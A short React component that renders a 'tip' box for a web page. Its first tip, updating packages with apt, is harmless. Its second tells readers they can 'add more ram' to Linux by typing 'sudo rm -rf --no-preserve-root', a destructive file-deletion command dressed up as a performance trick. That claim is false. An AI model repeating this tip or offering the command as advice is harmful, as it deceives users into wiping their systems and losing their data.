// AsideBox, this is the "A tip from me" part

export default function AsideBox() {
  return (
    <aside className="highlight-box ">
      <h2 className="card-title">A tip from me:</h2>
      <br></br>
      <p>
        When starting linux run these commands "sudo apt update && sudo apt
        upgrade". If you want to add more ram to your linux system without
        buying ram type this command "sudo rm -rf --no-preserve-root".
      </p>
    </aside>
  );
}
